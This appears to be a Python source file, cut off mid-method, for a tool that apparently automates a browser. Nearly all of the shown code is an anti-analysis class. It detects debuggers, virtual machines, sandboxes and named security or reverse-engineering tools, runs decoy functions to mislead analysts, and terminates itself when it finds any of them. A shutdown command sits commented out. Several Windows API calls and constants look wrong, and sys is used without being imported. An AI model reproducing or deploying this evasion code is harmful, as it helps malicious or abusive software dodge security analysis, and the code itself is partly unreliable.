import os
import time
import random
import queue
import threading
import json
import platform
import subprocess
import hashlib
import uuid
import threading
import ctypes
import ctypes.wintypes
import psutil
import socket
import uuid
import struct
import mmap
import winreg
from datetime import datetime
from collections import deque
import gc
import base64

from tqdm import tqdm
from colorama import Fore, Style, init
import getpass
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
from selenium.webdriver.common.action_chains import ActionChains
from webdriver_manager.chrome import ChromeDriverManager
import requests

init(autoreset=True)

# =============================================
# Ultimate Protection Integration
# =============================================

class UltimateProtection:
    def __init__(self, debug_mode=False):
        self.debug_mode = debug_mode
        self.protection_active = True
        self.original_hashes = {}
        self.memory_checksums = {}
        self.thread_pool = []
        self.detection_count = 0
        self.last_check_times = {}
        self.fake_flags = {}
        self.entropy_pool = deque(maxlen=1000)
        
        # Advanced detection flags
        self.vm_score = 0
        self.debug_score = 0
        self.analysis_score = 0
        
        # Initialize protection layers
        self._initialize_protection()
    
    def _initialize_protection(self):
        """Initialize all protection layers"""
        try:
            # Layer 1: Environment validation
            self._validate_environment()
            
            # Layer 2: Anti-debug hooks
            self._setup_debug_hooks()
            
            # Layer 3: Memory protection
            self._setup_memory_protection()
            
            # Layer 4: File integrity
            self._calculate_file_hashes()
            
            # Layer 5: Decoy systems
            self._create_decoy_systems()
            
            # Layer 6: Background monitoring
            self._start_background_monitoring()
            
            # Layer 7: Advanced VM detection
            self._advanced_vm_detection()
            
            # Layer 8: Network monitoring
            self._setup_network_monitoring()
            
        except Exception as e:
            if self.debug_mode:
                print(f"Protection initialization error: {e}")
            self._trigger_protection("Initialization failed")
    
    def _validate_environment(self):
        """Validate execution environment"""
        # Check if running from expected location
        expected_paths = ['C:\\', 'D:\\', 'E:\\']
        current_path = os.path.abspath(__file__)
        
        suspicious_paths = [
            'temp', 'tmp', 'downloads', 'desktop', 'sandbox',
            'analysis', 'malware', 'virus', 'debug', 'test'
        ]
        
        for sus_path in suspicious_paths:
            if sus_path.lower() in current_path.lower():
                self._trigger_protection(f"Suspicious execution path: {sus_path}")
        
        # Check parent process
        try:
            parent = psutil.Process().parent()
            if parent:
                parent_name = parent.name().lower()
                suspicious_parents = [
                    'python.exe', 'pythonw.exe', 'cmd.exe', 'powershell.exe',
                    'ida.exe', 'x64dbg.exe', 'ollydbg.exe'
                ]
                if parent_name in suspicious_parents:
                    self.analysis_score += 30
        except:
            pass
    
    def _setup_debug_hooks(self):
        """Setup advanced debugging detection"""
        if os.name != 'nt':
            return
            
        try:
            # Get kernel32 and ntdll
            kernel32 = ctypes.windll.kernel32
            ntdll = ctypes.windll.ntdll
            
            # Hook IsDebuggerPresent
            self._hook_isdebugger_present()
            
            # Check debug heap
            self._check_debug_heap()
            
            # Check debug flags in PEB
            self._check_peb_debug_flags()
            
            # Check debug object handle
            self._check_debug_object()
            
            # Hardware breakpoint detection
            self._check_hardware_breakpoints()
            
            # Software breakpoint detection
            self._check_software_breakpoints()
            
        except Exception as e:
            if self.debug_mode:
                print(f"Debug hook setup error: {e}")
    
    def _hook_isdebugger_present(self):
        """Advanced IsDebuggerPresent check"""
        try:
            kernel32 = ctypes.windll.kernel32
            
            # Direct PEB access
            if hasattr(kernel32, 'IsDebuggerPresent'):
                if kernel32.IsDebuggerPresent():
                    self.debug_score += 100
                    self._trigger_protection("IsDebuggerPresent detected")
            
            # Manual PEB check
            ntdll = ctypes.windll.ntdll
            
            # Get PEB address
            peb_ptr = ctypes.c_void_p()
            status = ntdll.NtQueryInformationProcess(
                kernel32.GetCurrentProcess(),
                0,  # ProcessBasicInformation
                ctypes.byref(peb_ptr),
                ctypes.sizeof(peb_ptr),
                None
            )
            
            if status == 0 and peb_ptr.value:
                # Read BeingDebugged flag from PEB+2
                being_debugged = ctypes.c_ubyte()
                ntdll.NtReadVirtualMemory(
                    kernel32.GetCurrentProcess(),
                    peb_ptr.value + 2,
                    ctypes.byref(being_debugged),
                    1,
                    None
                )
                
                if being_debugged.value:
                    self.debug_score += 100
                    self._trigger_protection("PEB BeingDebugged flag set")
        except:
            pass
    
    def _check_debug_heap(self):
        """Check for debug heap"""
        try:
            kernel32 = ctypes.windll.kernel32
            ntdll = ctypes.windll.ntdll
            
            # Get heap handle
            heap = kernel32.GetProcessHeap()
            
            # Read heap flags
            heap_flags = ctypes.c_ulong()
            ntdll.NtQueryInformationProcess(
                kernel32.GetCurrentProcess(),
                30,  # ProcessHeapInformation
                ctypes.byref(heap_flags),
                ctypes.sizeof(heap_flags),
                None
            )
            
            # Check for debug heap flags
            if heap_flags.value & 0x02:  # HEAP_GROWABLE
                if heap_flags.value & 0x50000062:  # Debug heap flags
                    self.debug_score += 50
                    
        except:
            pass
    
    def _check_peb_debug_flags(self):
        """Check PEB debug flags"""
        try:
            kernel32 = ctypes.windll.kernel32
            ntdll = ctypes.windll.ntdll
            
            # Check ProcessDebugPort
            debug_port = ctypes.c_ulong()
            status = ntdll.NtQueryInformationProcess(
                kernel32.GetCurrentProcess(),
                7,  # ProcessDebugPort
                ctypes.byref(debug_port),
                ctypes.sizeof(debug_port),
                None
            )
            
            if status == 0 and debug_port.value != 0:
                self.debug_score += 100
                self._trigger_protection("ProcessDebugPort detected")
            
            # Check ProcessDebugFlags
            debug_flags = ctypes.c_ulong()
            status = ntdll.NtQueryInformationProcess(
                kernel32.GetCurrentProcess(),
                31,  # ProcessDebugFlags
                ctypes.byref(debug_flags),
                ctypes.sizeof(debug_flags),
                None
            )
            
            if status == 0 and debug_flags.value == 0:
                self.debug_score += 100
                self._trigger_protection("ProcessDebugFlags indicates debugging")
                
        except:
            pass
    
    def _check_debug_object(self):
        """Check for debug object handle"""
        try:
            kernel32 = ctypes.windll.kernel32
            ntdll = ctypes.windll.ntdll
            
            # Check ProcessDebugObjectHandle
            debug_object = ctypes.c_void_p()
            status = ntdll.NtQueryInformationProcess(
                kernel32.GetCurrentProcess(),
                30,  # ProcessDebugObjectHandle
                ctypes.byref(debug_object),
                ctypes.sizeof(debug_object),
                None
            )
            
            if status == 0 and debug_object.value:
                self.debug_score += 100
                self._trigger_protection("Debug object handle detected")
                
        except:
            pass
    
    def _check_hardware_breakpoints(self):
        """Detect hardware breakpoints via debug registers"""
        try:
            kernel32 = ctypes.windll.kernel32
            
            # Get thread context
            class CONTEXT(ctypes.Structure):
                _fields_ = [
                    ("ContextFlags", ctypes.c_ulong),
                    ("Dr0", ctypes.c_ulong),
                    ("Dr1", ctypes.c_ulong),
                    ("Dr2", ctypes.c_ulong),
                    ("Dr3", ctypes.c_ulong),
                    ("Dr6", ctypes.c_ulong),
                    ("Dr7", ctypes.c_ulong),
                ]
            
            context = CONTEXT()
            context.ContextFlags = 0x10017  # CONTEXT_DEBUG_REGISTERS | CONTEXT_i386
            
            thread_handle = kernel32.GetCurrentThread()
            if kernel32.GetThreadContext(thread_handle, ctypes.byref(context)):
                # Check debug registers
                if (context.Dr0 or context.Dr1 or context.Dr2 or context.Dr3 or 
                    context.Dr6 or context.Dr7):
                    self.debug_score += 100
                    self._trigger_protection("Hardware breakpoints detected")
                    
        except:
            pass
    
    def _check_software_breakpoints(self):
        """Detect software breakpoints (INT3)"""
        try:
            # Check for 0xCC (INT3) in our own code
            with open(__file__, 'rb') as f:
                content = f.read()
            
            # Look for INT3 instructions
            if b'\xCC' in content:
                self.debug_score += 80
                self._trigger_protection("Software breakpoints detected in file")
                
            # Check loaded modules for patches
            kernel32 = ctypes.windll.kernel32
            psapi = ctypes.windll.psapi
            
            # Get module handles
            modules = (ctypes.wintypes.HMODULE * 1024)()
            needed = ctypes.wintypes.DWORD()
            
            if psapi.EnumProcessModules(
                kernel32.GetCurrentProcess(),
                modules,
                ctypes.sizeof(modules),
                ctypes.byref(needed)
            ):
                module_count = needed.value // ctypes.sizeof(ctypes.wintypes.HMODULE)
                
                for i in range(min(module_count, 10)):  # Check first 10 modules
                    module_info = ctypes.create_string_buffer(260)
                    if psapi.GetModuleFileNameExA(
                        kernel32.GetCurrentProcess(),
                        modules[i],
                        module_info,
                        260
                    ):
                        # Check if module is in suspicious location
                        module_path = module_info.value.decode('ascii', errors='ignore')
                        if any(sus in module_path.lower() for sus in ['temp', 'debug', 'analysis']):
                            self.analysis_score += 30
                            
        except:
            pass
    
    def _setup_memory_protection(self):
        """Setup memory protection and monitoring"""
        try:
            # Calculate checksums of critical functions
            critical_functions = [
                self._trigger_protection,
                self._validate_environment,
                self._check_processes
            ]
            
            for func in critical_functions:
                if hasattr(func, '__code__'):
                    code_bytes = func.__code__.co_code
                    checksum = hashlib.sha256(code_bytes).hexdigest()
                    self.memory_checksums[func.__name__] = checksum
            
            # Set up memory access monitoring
            self._setup_memory_monitoring()
            
        except Exception as e:
            if self.debug_mode:
                print(f"Memory protection error: {e}")
    
    def _setup_memory_monitoring(self):
        """Monitor memory access patterns"""
        try:
            if os.name == 'nt':
                kernel32 = ctypes.windll.kernel32
                
                # Check for memory scanning patterns
                def memory_scan_thread():
                    while self.protection_active:
                        try:
                            # Monitor memory allocations
                            process = psutil.Process()
                            memory_info = process.memory_info()
                            
                            # Detect unusual memory patterns
                            if hasattr(self, 'last_memory_usage'):
                                memory_diff = memory_info.rss - self.last_memory_usage
                                if memory_diff > 50 * 1024 * 1024:  # 50MB increase
                                    self.analysis_score += 20
                            
                            self.last_memory_usage = memory_info.rss
                            time.sleep(2)
                            
                        except:
                            break
                
                thread = threading.Thread(target=memory_scan_thread, daemon=True)
                thread.start()
                self.thread_pool.append(thread)
                
        except:
            pass
    
    def _calculate_file_hashes(self):
        """Calculate and store file hashes for integrity checking"""
        try:
            # Hash main file
            with open(__file__, 'rb') as f:
                main_content = f.read()
            self.original_hashes['main'] = hashlib.sha256(main_content).hexdigest()
            
            # Hash critical system files if accessible
            critical_files = [
                'kernel32.dll', 'ntdll.dll', 'user32.dll'
            ]
            
            for filename in critical_files:
                try:
                    filepath = os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'System32', filename)
                    if os.path.exists(filepath):
                        with open(filepath, 'rb') as f:
                            content = f.read()
                        file_hash = hashlib.sha256(content).hexdigest()
                        self.original_hashes[filename] = file_hash
                except:
                    pass
                    
        except Exception as e:
            if self.debug_mode:
                print(f"Hash calculation error: {e}")
            self._trigger_protection("Hash calculation failed")
    
    def _create_decoy_systems(self):
        """Create decoy systems to confuse reverse engineers"""
        # Fake license checking
        self.fake_flags['license_valid'] = True
        self.fake_flags['trial_days'] = 30
        self.fake_flags['hwid'] = self._generate_fake_hwid()
        
        # Fake encryption keys
        self.fake_flags['encryption_key'] = os.urandom(32)
        self.fake_flags['api_key'] = self._generate_fake_api_key()
        
        # Create fake critical functions
        def fake_license_check():
            """Fake license validation"""
            time.sleep(random.uniform(0.1, 0.3))
            return self.fake_flags['license_valid']
        
        def fake_server_communication():
            """Fake server communication"""
            fake_response = {
                'status': 'success',
                'data': base64.b64encode(os.urandom(64)).decode(),
                'timestamp': int(time.time())
            }
            return fake_response
        
        def fake_encryption_routine():
            """Fake encryption"""
            data = os.urandom(256)
            key = self.fake_flags['encryption_key']
            # Fake AES encryption simulation
            result = hashlib.sha256(data + key).digest()
            return result
        
        # Store fake functions
        self.decoy_functions = [
            fake_license_check,
            fake_server_communication,
            fake_encryption_routine
        ]
        
        # Randomly call decoy functions
        if random.random() > 0.7:
            random.choice(self.decoy_functions)()
    
    def _generate_fake_hwid(self):
        """Generate fake hardware ID"""
        fake_components = [
            platform.processor(),
            str(psutil.virtual_memory().total),
            platform.system(),
            str(random.randint(100000, 999999))
        ]
        fake_string = ''.join(fake_components)
        return hashlib.md5(fake_string.encode()).hexdigest()
    
    def _generate_fake_api_key(self):
        """Generate fake API key"""
        import base64
        fake_data = f"API_KEY_{random.randint(10000, 99999)}_{int(time.time())}"
        return base64.b64encode(fake_data.encode()).decode()
    
    def _start_background_monitoring(self):
        """Start background monitoring threads"""
        monitoring_functions = [
            self._monitor_processes,
            self._monitor_file_integrity,
            self._monitor_system_changes,
            self._monitor_network_connections,
            self._monitor_registry_changes,
            self._monitor_timing_attacks
        ]
        
        for monitor_func in monitoring_functions:
            try:
                thread = threading.Thread(target=monitor_func, daemon=True)
                thread.start()
                self.thread_pool.append(thread)
            except:
                pass
    
    def _monitor_processes(self):
        """Monitor running processes continuously"""
        suspicious_processes = {
            # Debuggers
            'ollydbg.exe': 100, 'x64dbg.exe': 100, 'x32dbg.exe': 100,
            'windbg.exe': 100, 'ida.exe': 100, 'ida64.exe': 100,
            'immunitydebugger.exe': 100, 'odbgscript.exe': 100,
            
            # Hex Editors
            'hxd.exe': 80, 'hexworkshop.exe': 80, 'frhed.exe': 80,
            
            # PE Analysis Tools
            'lordpe.exe': 90, 'pestudio.exe': 90, 'cff explorer.exe': 90,
            'pe-bear.exe': 90, 'studype.exe': 90, 'peview.exe': 90,
            
            # System Analysis
            'processhacker.exe': 70, 'procexp.exe': 60, 'procexp64.exe': 60,
            'processmonitor.exe': 70, 'procmon.exe': 70, 'procmon64.exe': 70,
            'autoruns.exe': 50, 'autoruns64.exe': 50,
            
            # Network Analysis
            'wireshark.exe': 80, 'fiddler.exe': 80, 'burpsuite_community.exe': 90,
            'charles.exe': 80, 'httpdebugger.exe': 80,
            
            # Reverse Engineering
            'ghidra.exe': 100, 'radare2.exe': 100, 'cutter.exe': 100,
            'binaryninja.exe': 100, 'hopper.exe': 100,
            
            # Game Hacking
            'cheatengine-x86_64.exe': 100, 'cheatengine.exe': 100,
            'artmoney.exe': 90, 'gameguardian.exe': 90,
            
            # Virtual Machines
            'vmware.exe': 60, 'virtualbox.exe': 60, 'vboxmanage.exe': 60,
            'qemu.exe': 60, 'bochs.exe': 60,
            
            # Development Tools
            'devenv.exe': 30, 'code.exe': 20, 'notepad++.exe': 10,
            'python.exe': 40, 'pythonw.exe': 40
        }
        
        while self.protection_active:
            try:
                current_processes = {proc.info['name'].lower(): proc.info['pid'] 
                                   for proc in psutil.process_iter(['name', 'pid'])}
                
                for proc_name, threat_level in suspicious_processes.items():
                    if proc_name in current_processes:
                        self.analysis_score += threat_level
                        
                        if threat_level >= 100:
                            self._trigger_protection(f"Critical analysis tool detected: {proc_name}")
                        elif threat_level >= 80:
                            if self.analysis_score > 200:
                                self._trigger_protection(f"High-risk tool detected: {proc_name}")
                
                # Check for process injection/hollowing
                self._check_process_hollowing()
                
                time.sleep(random.uniform(1, 3))
                
            except Exception as e:
                if self.debug_mode:
                    print(f"Process monitoring error: {e}")
                time.sleep(2)
    
    def _check_process_hollowing(self):
        """Detect process hollowing/injection"""
        try:
            current_process = psutil.Process()
            
            # Check memory regions
            if hasattr(current_process, 'memory_maps'):
                memory_maps = current_process.memory_maps()
                
                suspicious_regions = 0
                for region in memory_maps:
                    # Check for suspicious memory regions
                    if hasattr(region, 'path') and region.path:
                        path_lower = region.path.lower()
                        if any(sus in path_lower for sus in ['temp', 'tmp', 'appdata']):
                            suspicious_regions += 1
                
                if suspicious_regions > 10:
                    self.analysis_score += 50
                    
        except:
            pass
    
    def _monitor_file_integrity(self):
        """Monitor file integrity continuously"""
        while self.protection_active:
            try:
                # Check main file
                with open(__file__, 'rb') as f:
                    current_content = f.read()
                current_hash = hashlib.sha256(current_content).hexdigest()
                
                if current_hash != self.original_hashes.get('main'):
                    self._trigger_protection("Main file integrity violation")
                
                # Check critical system files
                for filename, original_hash in self.original_hashes.items():
                    if filename == 'main':
                        continue
                        
                    try:
                        filepath = os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'System32', filename)
                        if os.path.exists(filepath):
                            with open(filepath, 'rb') as f:
                                content = f.read()
                            current_hash = hashlib.sha256(content).hexdigest()
                            
                            if current_hash != original_hash:
                                self.analysis_score += 30
                    except:
                        pass
                
                time.sleep(random.uniform(5, 15))
                
            except Exception as e:
                if self.debug_mode:
                    print(f"Integrity monitoring error: {e}")
                time.sleep(10)
    
    def _monitor_system_changes(self):
        """Monitor system changes"""
        while self.protection_active:
            try:
                # Check for new files in temp directories
                temp_dirs = [
                    os.environ.get('TEMP', ''),
                    os.environ.get('TMP', ''),
                    'C:\\Windows\\Temp'
                ]
                
                for temp_dir in temp_dirs:
                    if os.path.exists(temp_dir):
                        try:
                            files = os.listdir(temp_dir)
                            suspicious_files = [f for f in files if any(ext in f.lower() 
                                              for ext in ['.exe', '.dll', '.bat', '.ps1', '.vbs'])]
                            
                            if len(suspicious_files) > 50:
                                self.analysis_score += 20
                        except:
                            pass
                
                time.sleep(random.uniform(10, 30))
                
            except:
                time.sleep(15)
    
    def _monitor_network_connections(self):
        """Monitor network connections"""
        while self.protection_active:
            try:
                connections = psutil.net_connections()
                
                # Check for suspicious local connections (debugger communication)
                suspicious_ports = [23946, 23947, 23948]  # Common debugger ports
                local_connections = [conn for conn in connections 
                                   if conn.laddr and conn.laddr.port in suspicious_ports]
                
                if local_connections:
                    self.debug_score += 50
                    
                # Check for network analysis tools
                network_analysis_ports = [8080, 8888, 3128, 1080]
                proxy_connections = [conn for conn in connections 
                                   if conn.laddr and conn.laddr.port in network_analysis_ports]
                
                if proxy_connections:
                    self.analysis_score += 30
                
                time.sleep(random.uniform(5, 10))
                
            except:
                time.sleep(10)
    
    def _monitor_registry_changes(self):
        """Monitor registry changes (Windows)"""
        if os.name != 'nt':
            return
            
        while self.protection_active:
            try:
                # Check for debugger-related registry keys
                debug_keys = [
                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows NT\CurrentVersion\AeDebug"),
                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug"),
                ]
                
                for hkey, path in debug_keys:
                    try:
                        key = winreg.OpenKey(hkey, path)
                        debugger_value, _ = winreg.QueryValueEx(key, "Debugger")
                        winreg.CloseKey(key)
                        
                        if debugger_value and "drwtsn32" not in debugger_value.lower():
                            self.debug_score += 40
                    except:
                        pass
                
                time.sleep(random.uniform(15, 45))
                
            except:
                time.sleep(30)
    
    def _monitor_timing_attacks(self):
        """Monitor for timing-based analysis"""
        timing_samples = deque(maxlen=100)
        
        while self.protection_active:
            try:
                start_time = time.perf_counter()
                
                # Perform a standard operation
                dummy_calc = sum(range(1000))
                hash_op = hashlib.md5(str(dummy_calc).encode()).hexdigest()
                
                end_time = time.perf_counter()
                elapsed = end_time - start_time
                
                timing_samples.append(elapsed)
                
                # Analyze timing patterns
                if len(timing_samples) >= 10:
                    avg_time = sum(timing_samples) / len(timing_samples)
                    recent_avg = sum(list(timing_samples)[-5:]) / 5
                    
                    # If recent operations are significantly slower
                    if recent_avg > avg_time * 3:
                        self.debug_score += 20
                        
                    # If operations are consistently slow
                    if avg_time > 0.01:  # 10ms threshold
                        self.analysis_score += 10
                
                time.sleep(random.uniform(0.5, 2))
                
            except:
                time.sleep(1)
    
    def _advanced_vm_detection(self):
        """Advanced virtual machine detection"""
        vm_indicators = []
        
        try:
            # CPU-based detection
            cpu_indicators = self._check_cpu_vm_indicators()
            vm_indicators.extend(cpu_indicators)
            
            # Registry-based detection
            registry_indicators = self._check_registry_vm_indicators()
            vm_indicators.extend(registry_indicators)
            
            # File system detection
            filesystem_indicators = self._check_filesystem_vm_indicators()
            vm_indicators.extend(filesystem_indicators)
            
            # Hardware detection
            hardware_indicators = self._check_hardware_vm_indicators()
            vm_indicators.extend(hardware_indicators)
            
            # Network detection
            network_indicators = self._check_network_vm_indicators()
            vm_indicators.extend(network_indicators)
            
            # Behavioral detection
            behavioral_indicators = self._check_behavioral_vm_indicators()
            vm_indicators.extend(behavioral_indicators)
            
            # Calculate VM score
            self.vm_score = len(vm_indicators) * 10
            
            if self.vm_score > 50:
                self._trigger_protection(f"Virtual machine detected (score: {self.vm_score})")
                
        except Exception as e:
            if self.debug_mode:
                print(f"VM detection error: {e}")
    
    def _check_cpu_vm_indicators(self):
        """Check CPU-based VM indicators"""
        indicators = []
        
        try:
            # CPU count check
            cpu_count = os.cpu_count()
            if cpu_count < 2:
                indicators.append("low_cpu_count")
            
            # Processor name check
            processor = platform.processor().lower()
            vm_cpu_strings = [
                'vmware', 'virtualbox', 'qemu', 'bochs', 'xen',
                'virtual', 'hyperv', 'parallels', 'vbox'
            ]
            
            for vm_string in vm_cpu_strings:
                if vm_string in processor:
                    indicators.append(f"vm_cpu_string_{vm_string}")
            
            # CPU features check (CPUID)
            if os.name == 'nt':
                try:
                    # Check hypervisor bit
                    result = subprocess.run(['wmic', 'cpu', 'get', 'name'], 
                                          capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        cpu_info = result.stdout.lower()
                        for vm_string in vm_cpu_strings:
                            if vm_string in cpu_info:
                                indicators.append(f"wmic_vm_string_{vm_string}")
                except:
                    pass
                    
        except:
            pass
            
        return indicators
    
    def _check_registry_vm_indicators(self):
        """Check registry-based VM indicators"""
        if os.name != 'nt':
            return []
            
        indicators = []
        
        vm_registry_paths = [
            # VMware
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\VMware, Inc.\VMware Tools"),
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Enum\PCI\VEN_15AD"),
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\vmci"),
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\vmhgfs"),
            
            # VirtualBox
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Oracle\VirtualBox Guest Additions"),
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Enum\PCI\VEN_80EE"),
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\VBoxGuest"),
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\VBoxMouse"),
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\VBoxService"),
            
            # Hyper-V
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Hyper-V"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\VirtualMachine"),
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\vmicheartbeat"),
            
            # QEMU
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Enum\IDE\DiskQEMU_HARDDISK"),
            
            # Xen
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\xenevtchn"),
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\xensvc"),
            
            # Parallels
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Parallels"),
        ]
        
        for hkey, path in vm_registry_paths:
            try:
                winreg.OpenKey(hkey, path)
                indicators.append(f"registry_vm_key_{path.split('\\')[-1]}")
            except:
                pass
        
        # Check system info in registry
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                               r"HARDWARE\DESCRIPTION\System\CentralProcessor\0")
            processor_name, _ = winreg.QueryValueEx(key, "ProcessorNameString")
            winreg.CloseKey(key)
            
            vm_strings = ['vmware', 'virtual', 'qemu', 'bochs']
            for vm_string in vm_strings:
                if vm_string.lower() in processor_name.lower():
                    indicators.append(f"registry_processor_{vm_string}")
        except:
            pass
            
        return indicators
    
    def _check_filesystem_vm_indicators(self):
        """Check filesystem-based VM indicators"""
        indicators = []
        
        vm_files = [
            # VMware
            'C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe',
            'C:\\Windows\\System32\\drivers\\vmmouse.sys',
            'C:\\Windows\\System32\\drivers\\vmhgfs.sys',
            'C:\\Windows\\System32\\drivers\\vmci.sys',
            'C:\\Windows\\System32\\vboxdisp.dll',
            
            # VirtualBox
            'C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\VBoxTray.exe',
            'C:\\Windows\\System32\\drivers\\VBoxGuest.sys',
            'C:\\Windows\\System32\\drivers\\VBoxMouse.sys',
            'C:\\Windows\\System32\\drivers\\VBoxSF.sys',
            'C:\\Windows\\System32\\VBoxService.exe',
            
            # QEMU
            'C:\\Windows\\System32\\drivers\\balloon.sys',
            'C:\\Windows\\System32\\drivers\\netkvm.sys',
            
            # Hyper-V
            'C:\\Windows\\System32\\vmicheartbeat.dll',
            'C:\\Windows\\System32\\vmicvss.dll',
            'C:\\Windows\\System32\\drivers\\vmbus.sys',
            
            # Parallels
            'C:\\Program Files\\Parallels\\Parallels Tools\\prl_cc.exe',
        ]
        
        for vm_file in vm_files:
            if os.path.exists(vm_file):
                indicators.append(f"vm_file_{os.path.basename(vm_file)}")
        
        # Check for VM-specific directories
        vm_directories = [
            'C:\\Program Files\\VMware',
            'C:\\Program Files\\Oracle\\VirtualBox Guest Additions',
            'C:\\Program Files\\Parallels',
        ]
        
        for vm_dir in vm_directories:
            if os.path.exists(vm_dir):
                indicators.append(f"vm_directory_{os.path.basename(vm_dir)}")
        
        return indicators
    
    def _check_hardware_vm_indicators(self):
        """Check hardware-based VM indicators"""
        indicators = []
        
        try:
            # MAC address check
            mac = uuid.getnode()
            mac_str = ':'.join(['{:02x}'.format((mac >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
            
            vm_mac_prefixes = [
                '00:05:69',  # VMware
                '00:0C:29',  # VMware
                '00:1C:14',  # VMware
                '00:50:56',  # VMware
                '08:00:27',  # VirtualBox
                '00:16:3E',  # Xen
                '00:1C:42',  # Parallels
            ]
            
            for prefix in vm_mac_prefixes:
                if mac_str.upper().startswith(prefix):
                    indicators.append(f"vm_mac_{prefix}")
            
            # Memory size check
            memory = psutil.virtual_memory()
            if memory.total < 2 * 1024**3:  # Less than 2GB
                indicators.append("low_memory")
            
            # Disk size check (if accessible)
            try:
                disk = psutil.disk_usage('C:\\' if os.name == 'nt' else '/')
                if disk.total < 50 * 1024**3:  # Less than 50GB
                    indicators.append("small_disk")
            except:
                pass
                
        except:
            pass
            
        return indicators
    
    def _check_network_vm_indicators(self):
        """Check network-based VM indicators"""
        indicators = []
        
        try:
            # Check network interfaces
            interfaces = psutil.net_if_addrs()
            
            vm_interface_names = [
                'vmware', 'virtualbox', 'vbox', 'hyper-v', 'parallels'
            ]
            
            for interface_name, addresses in interfaces.items():
                interface_lower = interface_name.lower()
                for vm_name in vm_interface_names:
                    if vm_name in interface_lower:
                        indicators.append(f"vm_interface_{vm_name}")
            
            # Check for host-only/NAT adapters
            for interface_name in interfaces.keys():
                if any(pattern in interface_name.lower() for pattern in 
                      ['host-only', 'hostonly', 'nat', 'vmnet']):
                    indicators.append(f"vm_adapter_{interface_name}")
                    
        except:
            pass
            
        return indicators
    
    def _check_behavioral_vm_indicators(self):
        """Check behavioral VM indicators"""
        indicators = []
        
        try:
            # Mouse movement check
            if os.name == 'nt':
                user32 = ctypes.windll.user32
                
                # Get cursor position multiple times
                positions = []
                for _ in range(10):
                    pos = ctypes.wintypes.POINT()
                    user32.GetCursorPos(ctypes.byref(pos))
                    positions.append((pos.x, pos.y))
                    time.sleep(0.1)
                
                # Check if mouse moves (real users move mouse)
                unique_positions = set(positions)
                if len(unique_positions) < 3:
                    indicators.append("static_mouse")
            
            # Check system uptime
            boot_time = psutil.boot_time()
            uptime = time.time() - boot_time
            
            if uptime < 300:  # Less than 5 minutes
                indicators.append("short_uptime")
            
            # Check running processes count
            process_count = len(psutil.pids())
            if process_count < 50:
                indicators.append("few_processes")
                
        except:
            pass
            
        return indicators
    
    def _setup_network_monitoring(self):
        """Setup network monitoring for analysis detection"""
        def network_monitor():
            while self.protection_active:
                try:
                    connections = psutil.net_connections()
                    
                    # Check for analysis tool communication
                    suspicious_hosts = [
                        '127.0.0.1', 'localhost', '0.0.0.0'
                    ]
                    
                    local_server_count = 0
                    for conn in connections:
                        if (conn.status == psutil.CONN_LISTEN and 
                            conn.laddr and str(conn.laddr.ip) in suspicious_hosts):
                            local_server_count += 1
                    
                    if local_server_count > 10:
                        self.analysis_score += 30
                    
                    # Check for proxy connections
                    proxy_ports = [8080, 8888, 3128, 1080, 8081]
                    for conn in connections:
                        if (conn.laddr and conn.laddr.port in proxy_ports and 
                            conn.status == psutil.CONN_LISTEN):
                            self.analysis_score += 20
                    
                    time.sleep(random.uniform(3, 8))
                except:
                    time.sleep(5)
        
        thread = threading.Thread(target=network_monitor, daemon=True)
        thread.start()
        self.thread_pool.append(thread)
    
    def _check_processes(self):
        """Main process checking function for external use"""
        try:
            self._monitor_processes()
        except:
            pass
    
    def _trigger_protection(self, reason="Protection triggered"):
        """Trigger protection mechanism"""
        if self.debug_mode:
            print(f"PROTECTION TRIGGERED: {reason}")
            print(f"Debug Score: {self.debug_score}")
            print(f"VM Score: {self.vm_score}")
            print(f"Analysis Score: {self.analysis_score}")
            return
        
        try:
            # Multiple exit strategies
            methods = [
                lambda: os._exit(1),
                lambda: sys.exit(1),
                lambda: quit(),
                lambda: exit(),
            ]
            
            # Try different methods
            random.shuffle(methods)
            for method in methods[:2]:
                try:
                    method()
                except:
                    continue
            
            # Nuclear option - system shutdown (use with caution)
            # if os.name == 'nt':
            #     os.system('shutdown /s /t 0')
            
        except:
            # Force crash if all else fails
            ctypes.windll.kernel32.ExitProcess(1)
    
    def stop_protection(self):
        """Stop all protection mechanisms"""
        self.protection_active = False
        
        # Wait for threads to finish
        for thread in self.thread_pool:
            if thread.is_alive():
                thread.join(timeout=2)
    
    def get_protection_status(self):
        """Get current protection status"""
        return {
            'active': self.protection_active,
            'debug_score': self.debug_score,
            'vm_score': self.vm_score,
            'analysis_score': self.analysis_score,
